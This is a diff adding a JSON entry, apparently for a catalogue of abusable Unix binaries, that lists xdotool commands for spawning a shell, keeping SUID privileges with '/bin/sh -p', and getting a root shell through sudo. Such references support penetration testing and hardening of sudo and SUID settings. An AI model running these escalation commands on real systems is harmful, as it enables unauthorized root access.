@@ -1,0 +1,22 @@
+{
+  "functions": {
+    "shell": [
+      {
+        "description": "",
+        "code": "xdotool exec --sync /bin/sh\n"
+      }
+    ],
+    "suid": [
+      {
+        "description": "",
+        "code": "./xdotool exec --sync /bin/sh -p\n"
+      }
+    ],
+    "sudo": [
+      {
+        "description": "",
+        "code": "sudo xdotool exec --sync /bin/sh\n"
+      }
+    ]
+  }
+}
